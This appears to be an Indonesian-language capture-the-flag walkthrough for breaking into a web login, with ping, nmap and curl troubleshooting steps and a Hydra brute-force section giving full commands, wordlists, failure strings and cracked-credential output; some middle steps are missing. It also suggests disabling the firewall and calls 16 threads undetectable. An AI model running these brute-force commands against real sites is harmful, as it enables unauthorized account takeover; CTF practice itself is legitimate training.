STEP 1: VERIFIKASI TARGET ACCESSIBLE (2 MENIT)
═══════════════════════════════════════════════════════════════════════════════

TUJUAN: Pastikan target online & accessible

COMMAND:
────────
ping target-ctf.com

OUTPUT YANG DIHARAPKAN:
───────────────────────
PING target-ctf.com (192.168.1.100) 56(84) bytes of data.
64 bytes from 192.168.1.100: icmp_seq=1 ttl=64 time=5.2 ms

✅ SUKSES! = Terus ke STEP 2
❌ GAGAL = Lihat TROUBLESHOOTING A1

───────────────────────────────────────────────────────────────────────────────

TROUBLESHOOTING A1: Ping gagal / "Destination Host Unreachable"
──────────────────────────────────────────────────────────────

ERROR MESSAGE:
"Destination Host Unreachable"
atau
"ping: unknown host target-ctf.com"

SOLUSI:
1. Cek DNS resolution
   $ nslookup target-ctf.com
   
   Jika output ada:
   Name: target-ctf.com
   Address: 192.168.1.100
   → DNS OK, lanjut ke STEP 2 (mungkin ping blocked)
   
   Jika output: "** server can't find target-ctf.com"
   → Domain salah / tidak exist
   → Check ulang domain dari soal/file

2. Coba IP langsung (jika sudah ada IP)
   $ ping 192.168.1.100
   
3. Kalau masih gagal, cek firewall
   $ sudo ufw status
   
   Kalau firewall aktif:
   $ sudo ufw disable  (untuk testing saja!)

4. Coba akses dari browser manual dulu
   Buka: https://target-ctf.com di Chrome/Firefox
   Lihat apa ada response

LANJUT KE STEP 2 JIKA: Ping OK atau DNS resolve OK

═══════════════════════════════════════════════════════════════════════════════
STEP 2: CHECK PORT & SERVICE (2 MENIT)
═══════════════════════════════════════════════════════════════════════════════

TUJUAN: Pastikan port 80 (HTTP) atau 443 (HTTPS) open

COMMAND:
────────
nmap -Pn -p 80,443 target-ctf.com

PENJELASAN:
- -Pn = don't ping (assume host alive)
- -p 80,443 = scan port 80 dan 443

OUTPUT YANG DIHARAPKAN:
───────────────────────
Nmap scan report for target-ctf.com (192.168.1.100)

PORT    STATE  SERVICE
80/tcp  open   http
443/tcp open   https

✅ SUKSES! (port open) = Terus ke STEP 3
❌ GAGAL = Lihat TROUBLESHOOTING B1

───────────────────────────────────────────────────────────────────────────────

TROUBLESHOOTING B1: Port closed atau filtered
───────────────────────────────────────────────

ERROR OUTPUT:
PORT    STATE      SERVICE
80/tcp  closed     http
443/tcp filtered   https

SOLUSI:
1. Coba port lain yang umum
   $ nmap -Pn -p 8080,8443,3000,5000 target-ctf.com
   
2. Coba scan semua port (lebih lama)
   $ nmap -Pn -p- target-ctf.com
   
   Tunggu sampai selesai, lihat port mana yang open
   
3. Kalau ada port lain yang open (misal 8080)
   Gunakan di step berikutnya: https://target-ctf.com:8080
   
4. Firewall mungkin block
   $ sudo ufw allow 80
   $ sudo ufw allow 443

LANJUT KE STEP 3 JIKA: Ada port yang open (state: open)

───────────────────────────────────────────────────────────────────────────────

TROUBLESHOOTING C1: "curl: (7) Failed to connect"
──────────────────────────────────────────────────

ERROR:
curl: (7) Failed to connect to target-ctf.com port 443: Connection refused

SOLUSI:
1. Coba HTTP instead of HTTPS
   $ curl -v http://target-ctf.com/login.php
   
2. Coba dengan -k flag (ignore SSL)
   $ curl -k -v https://target-ctf.com/login.php
   
3. Increase timeout
   $ curl -m 30 -v https://target-ctf.com/login.php
   
4. Add user agent (kadang server block default curl)
   $ curl -A "Mozilla/5.0" -v https://target-ctf.com/login.php

───────────────────────────────────────────────────────────────────────────────

TROUBLESHOOTING C2: "curl: (6) Could not resolve host"
──────────────────────────────────────────────────────

ERROR:

SOLUSI:
1. Cek DNS
   $ nslookup target-ctf.com
   
2. Coba dengan IP langsung
   $ curl -v http://192.168.1.100/login.php
   
3. Add /etc/hosts entry (jika test lokal)
   $ sudo echo "192.168.1.100 target-ctf.com" >> /etc/hosts
   $ curl -v http://target-ctf.com/login.php

───────────────────────────────────────────────────────────────────────────────

TROUBLESHOOTING C3: "curl: (60) SSL certificate problem"
──────────────────────────────────────────────────────────

SOLUSI:

$ curl -k -v https://target-ctf.com/login.php

───────────────────────────────────────────────────────────────────────────────

TROUBLESHOOTING C4: "curl: (28) Operation timeout"
──────────────────────────────────────────────────

ERROR:
curl: (28) Operation timeout

SOLUSI:
Increase timeout ke 60 detik
$ curl -m 60 -v https://target-ctf.com/login.php

STEP 11: BRUTE FORCE DENGAN HYDRA (5-15 MENIT)
═══════════════════════════════════════════════════════════════════════════════

TUJUAN: Brute force username & password dengan Hydra

COMMAND 1: Setup wordlist
─────────────────────────
$ echo -e "admin\nroot\ntest\nadministrator\nuser\nguest" > users.txt

$ # Gunakan fasttrack wordlist (paling cepat)
$ hydra -L users.txt -P /usr/share/wordlists/fasttrack.txt \
  http-post-form://target-ctf.com/login.php:username=^USER^&password=^PASS^:Invalid \
  -t 16 -v

PENJELASAN PENTING:
- http-post-form:// = POST form (bukan URL langsung!)
- target-ctf.com = JANGAN PAKAI https:// di depan!
- /login.php = path ke form
- username=^USER^ = parameter username (ganti sesuai STEP 4)
- password=^PASS^ = parameter password (ganti sesuai STEP 4)
- :Invalid = FAILURE STRING (lihat dari STEP 5 error message)
- -t 16 = 16 threads (cepat, tidak ketahuan)

OUTPUT YANG DIHARAPKAN (SUKSES):
────────────────────────────────
[80][http-post-form] host: target-ctf.com   login: admin   password: P@ssw0rd!
[80][http-post-form] host: target-ctf.com   login: root    password: toor

✅ PASSWORD DITEMUKAN!
   Login dengan credentials: admin:P@ssw0rd!

OUTPUT YANG DIHARAPKAN (GAGAL):
───────────────────────────────
[STATUS] attack finished with 0 valid passwords found (0/70/70 combinations tried)

❌ PASSWORD TIDAK KETEMU, terus ke STEP 11B

───────────────────────────────────────────────────────────────────────────────

TROUBLESHOOTING H1: Hydra error "Could not find host"
──────────────────────────────────────────────────────

ERROR:
Could not find host or service provided

SOLUSI:
1. CHECK FORMAT! (paling common)
   ❌ SALAH: http-post-form://https://target-ctf.com/login.php:...
   ✅ BENAR: http-post-form://target-ctf.com/login.php:...
   
   Jangan pakai https:// dua kali!

2. Coba dengan port explicit
   $ hydra -L users.txt -P pass.txt \
     http-post-form://target-ctf.com:80/login.php:... -t 16

3. Coba dengan IP jika domain tidak resolve
   $ hydra -L users.txt -P pass.txt \
     http-post-form://192.168.1.100/login.php:... -t 16

───────────────────────────────────────────────────────────────────────────────

TROUBLESHOOTING H2: Hydra "0 valid passwords found" padahal yakin ada
────────────────────────────────────────────────────────────────────

PROBLEM:
Hydra tidak ketemu password padahal yakin ada

SOLUSI:
1. Failure string salah! (PALING SERING!)
   
   STEP 1: Manual test di curl untuk lihat exact error message
   $ curl -X POST https://target-ctf.com/login.php \
     -d "username=admin&password=wrongpass" -v
   
   Lihat response body, catat EXACT error message:
   - "Invalid credentials"
   - "Username or password incorrect"
   - "Login failed"
   - "Access denied"
   
   STEP 2: Gunakan exact string di hydra
   $ hydra -L users.txt -P pass.txt \
     http-post-form://target-ctf.com/login.php:username=^USER^&password=^PASS^:Invalid\ credentials \
     -t 16 -v
   
   Note: Escape spaces dengan \ atau gunakan quotes

2. Success string instead of failure string
   Jika error message tidak jelas, catat success message:
   
   Login successful, catat apa yang muncul:
   - "Welcome"
   - "Dashboard"
   - "Admin Panel"
   - "Logout"
   
   Gunakan di hydra:
   $ hydra -L users.txt -P pass.txt \
     http-post-form://target-ctf.com/login.php:username=^USER^&password=^PASS^:S=Welcome \
     -t 16 -v
   
   S= = SUCCESS string

3. Parameter names salah
   Double-check dari STEP 4!
   
   Jika parameter bukan username/password:
   $ curl -s https://target-ctf.com/login.php | grep 'name="' | head -10
   
   Output contoh:
   name="user"
   name="passwd"
   name="email"
   
   Gunakan correct names di hydra:
   $ hydra -L users.txt -P pass.txt \
     http-post-form://target-ctf.com/login.php:user=^USER^&passwd=^PASS^:Invalid \
     -t 16

4. Threads terlalu rendah (lambat tapi tidak berfungsi)
   Gunakan -t yang lebih besar:
   $ hydra ... -t 32 -v

5. Gunakan wordlist lebih besar (rockyou)
   $ hydra -L users.txt -P /usr/share/wordlists/rockyou.txt \
     http-post-form://... -t 16
   
   (warning: ini butuh 14+ menit)

⭐ CRITICAL SUCCESS FACTORS:

1. JANGAN SKIP STEP 4 (Get form parameters)
   - Pastikan parameter names BENAR
   - Salah parameter = semua tools gagal

2. FAILURE STRING (STEP 5, untuk Hydra)
   - Harus EXACT match dengan response
   - Copy-paste dari actual error message
   - Jangan asal-asalan

3. TRY SEQUENTIALLY (bukan semua sekaligus)
   - Default creds (cepat) → .env files → backups → SQL injection → brute force
   - Setiap step adalah fallback ke step berikutnya

4. VERIFY SETIAP STEP
   - Jangan assume success
   - Check output sebelum move to next step
   - Read error messages!

5. TROUBLESHOOTING = BAGIAN PENTING
   - Tidak ada guarantee tools langsung berhasil
   - Expect to debug & adjust
   - Mindset: "ada error, fix it, coba lagi"
